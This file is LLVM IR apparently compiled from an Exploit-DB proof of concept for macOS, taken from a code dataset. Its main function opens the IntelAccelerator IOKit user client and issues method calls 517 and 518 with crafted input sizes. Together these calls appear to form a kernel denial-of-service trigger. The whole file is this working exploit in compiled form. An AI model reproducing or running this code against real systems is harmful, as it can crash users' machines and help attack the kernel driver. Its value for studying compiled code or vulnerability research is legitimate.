; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39368.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39368.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"IntelAccelerator\00", align 1
@.str.1 = private unnamed_addr constant [46 x i8] c"unable to create service matching dictionary\0A\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [12 x i8] c"no matches\0A\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@.str.4 = private unnamed_addr constant [17 x i8] c"got service: %x\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@.str.6 = private unnamed_addr constant [31 x i8] c"got userclient connection: %x\0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"IOConnectCall error: %x\0A\00", align 1
@.str.8 = private unnamed_addr constant [50 x i8] c"that was an error in the first call, don't care!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca [16 x i64], align 16
  %12 = alloca i64, align 8
  %13 = alloca [4096 x i8], align 16
  %14 = alloca i64, align 8
  %15 = alloca [16 x i64], align 16
  %16 = alloca i64, align 8
  %17 = alloca [4096 x i8], align 16
  %18 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  store i32 %19, i32* %7, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %24, label %22

22:                                               ; preds = %2
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %86

24:                                               ; preds = %2
  %25 = load i32, i32* @kIOMasterPortDefault, align 4
  %26 = load i32, i32* %7, align 4
  %27 = call i64 @IOServiceGetMatchingServices(i32 %25, i32 %26, i32* %8)
  store i64 %27, i64* %6, align 8
  %28 = load i64, i64* %6, align 8
  %29 = load i64, i64* @KERN_SUCCESS, align 8
  %30 = icmp ne i64 %28, %29
  br i1 %30, label %31, label %33

31:                                               ; preds = %24
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %86

33:                                               ; preds = %24
  %34 = load i32, i32* %8, align 4
  %35 = call i64 @IOIteratorNext(i32 %34)
  store i64 %35, i64* %9, align 8
  %36 = load i64, i64* %9, align 8
  %37 = load i64, i64* @IO_OBJECT_NULL, align 8
  %38 = icmp eq i64 %36, %37
  br i1 %38, label %39, label %41

39:                                               ; preds = %33
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %86

41:                                               ; preds = %33
  %42 = load i64, i64* %9, align 8
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0), i64 %42)
  %44 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %44, i32* %10, align 4
  %45 = load i64, i64* %9, align 8
  %46 = call i32 (...) @mach_task_self()
  %47 = call i64 @IOServiceOpen(i64 %45, i32 %46, i32 1, i32* %10)
  store i64 %47, i64* %6, align 8
  %48 = load i64, i64* %6, align 8
  %49 = load i64, i64* @KERN_SUCCESS, align 8
  %50 = icmp ne i64 %48, %49
  br i1 %50, label %51, label %53

51:                                               ; preds = %41
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %86

53:                                               ; preds = %41
  %54 = load i32, i32* %10, align 4
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.6, i64 0, i64 0), i32 %54)
  store i64 0, i64* %12, align 8
  store i64 0, i64* %14, align 8
  store i64 0, i64* %16, align 8
  store i64 0, i64* %18, align 8
  store i64 0, i64* %12, align 8
  store i64 0, i64* %14, align 8
  store i64 0, i64* %16, align 8
  store i64 0, i64* %18, align 8
  store i64 48, i64* %14, align 8
  %56 = load i32, i32* %10, align 4
  %57 = getelementptr inbounds [16 x i64], [16 x i64]* %11, i64 0, i64 0
  %58 = load i64, i64* %12, align 8
  %59 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %60 = load i64, i64* %14, align 8
  %61 = getelementptr inbounds [16 x i64], [16 x i64]* %15, i64 0, i64 0
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %17, i64 0, i64 0
  %63 = call i64 @IOConnectCallMethod(i32 %56, i32 517, i64* %57, i64 %58, i8* %59, i64 %60, i64* %61, i64* %16, i8* %62, i64* %18)
  store i64 %63, i64* %6, align 8
  %64 = load i64, i64* %6, align 8
  %65 = load i64, i64* @KERN_SUCCESS, align 8
  %66 = icmp ne i64 %64, %65
  br i1 %66, label %67, label %71

67:                                               ; preds = %53
  %68 = load i64, i64* %6, align 8
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i64 %68)
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.8, i64 0, i64 0))
  br label %71

71:                                               ; preds = %67, %53
  store i64 1, i64* %14, align 8
  %72 = load i32, i32* %10, align 4
  %73 = getelementptr inbounds [16 x i64], [16 x i64]* %11, i64 0, i64 0
  %74 = load i64, i64* %12, align 8
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %76 = load i64, i64* %14, align 8
  %77 = getelementptr inbounds [16 x i64], [16 x i64]* %15, i64 0, i64 0
  %78 = getelementptr inbounds [4096 x i8], [4096 x i8]* %17, i64 0, i64 0
  %79 = call i64 @IOConnectCallMethod(i32 %72, i32 518, i64* %73, i64 %74, i8* %75, i64 %76, i64* %77, i64* %16, i8* %78, i64* %18)
  store i64 %79, i64* %6, align 8
  %80 = load i64, i64* %6, align 8
  %81 = load i64, i64* @KERN_SUCCESS, align 8
  %82 = icmp ne i64 %80, %81
  br i1 %82, label %83, label %86

83:                                               ; preds = %71
  %84 = load i64, i64* %6, align 8
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i64 %84)
  store i32 0, i32* %3, align 4
  br label %86

86:                                               ; preds = %22, %31, %39, %51, %83, %71
  %87 = load i32, i32* %3, align 4
  ret i32 %87
}

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @IOServiceGetMatchingServices(i32, i32, i32*) #1

declare dso_local i64 @IOIteratorNext(i32) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i64 @IOConnectCallMethod(i32, i32, i64*, i64, i8*, i64, i64*, i64*, i8*, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
